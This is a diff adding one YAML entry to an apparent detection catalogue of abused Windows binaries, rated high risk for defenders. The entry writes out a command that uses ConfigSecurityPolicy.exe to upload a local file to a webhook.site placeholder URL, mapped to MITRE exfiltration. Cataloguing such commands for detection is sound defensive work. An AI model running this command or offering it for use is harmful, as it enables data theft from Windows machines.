@@ -1,0 +1,19 @@
+- command: ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
+  description: Abuse ConfigSecurityPolicy.exe to upload calc.exe to an arbitrary remote location.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Exfiltration:
+      - T1567
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
+  risk: High
+  risk_reason: This is an extremely suspicious command and should raise immediate red flags.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically extremely rare in most organizations.
+  tool: ConfigSecurityPolicy
+  threatactors:
+    N/A:
+      - N/A
